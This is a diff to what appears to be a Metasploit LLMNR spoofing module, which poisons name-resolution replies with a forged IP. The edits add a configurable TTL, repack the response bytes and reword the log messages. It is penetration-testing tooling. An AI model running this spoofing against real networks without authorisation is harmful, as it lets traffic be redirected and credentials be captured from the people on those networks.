@@ -47,6 +47,7 @@ class Metasploit3 < Msf::Auxiliary
 			OptAddress.new('SPOOFIP', [ true, "IP address with which to poison responses", ""]),
 			OptAddress.new('SRVHOST', [ false, "IP address of INTERFACE", "0.0.0.0"]),
 			OptString.new('REGEX', [ true, "Regex applied to the LLMNR Name to determine if spoofed reply is sent", '.*']),
+			OptInt.new('TTL', [ false, "Time To Live for the spoofed response", 300]),
 		])
 
 		register_advanced_options([
@@ -74,13 +75,12 @@ class Metasploit3 < Msf::Auxiliary
 
 		@run = true
 
-		print_status("LLMNR Spoofer started. Listening for LLMNR requests...")
+		print_status("LLMNR Spoofer started. Listening for LLMNR requests with REGEX \"#{datastore['REGEX']}\" ...")
 
 		begin
 
 		while @run
 			packet, addr = @sock.recvfrom(128)
-			vprint_status("Packet received from #{addr[3]}")
 
 			rhost = addr[3]
 			src_port = addr[1]
@@ -119,7 +119,6 @@ class Metasploit3 < Msf::Auxiliary
 
 			if (llmnr_decodedname =~ /#{datastore['REGEX']}/i)
 
-				vprint_status("Regex matched #{llmnr_decodedname} from #{rhost}. Sending reply...")
 
 				#Header
 				response =  llmnr_transid
@@ -136,7 +135,7 @@ class Metasploit3 < Msf::Auxiliary
 				response << llmnr_name_and_length
 				response << llmnr_type
 				response << llmnr_class
-				response << "\x00\x04\x93\xe0" # TTL
+				response << [datastore['TTL']].pack("N") #Default 5 minutes
 				response << "\x00\x04" # Datalength = 4
 				response << datastore['SPOOFIP'].split('.').collect(&:to_i).pack('C*')
 
@@ -152,19 +151,20 @@ class Metasploit3 < Msf::Auxiliary
 					p.recalc
 
 					capture_sendto(p, rhost,true)
-					vprint_good("Reply for #{llmnr_decodedname} sent to #{rhost} with spoofed IP #{datastore['SPOOFIP']}...")
+					vprint_good("Reply for #{llmnr_decodedname} sent to #{rhost} with spoofed IP #{datastore['SPOOFIP']}")
 				close_pcap
 
 			else
-				vprint_status("Packet received from #{rhost} with name #{llmnr_decodedname} did not match regex")
+				vprint_status("Packet received from #{rhost} with name #{llmnr_decodedname} did not match REGEX \"#{datastore['REGEX']}\"")
 			end
 		end
 
-		rescue ::Exception => e
-			print_error("llmnr: #{e.class} #{e} #{e.backtrace}")
-		# Make sure the socket gets closed on exit
-		ensure
-			@sock.close
-		end
+
+	end
+	rescue ::Exception => e
+		print_error("llmnr: #{e.class} #{e}")
+	# Make sure the socket gets closed on exit
+	ensure
+		@sock.close
 	end
 end
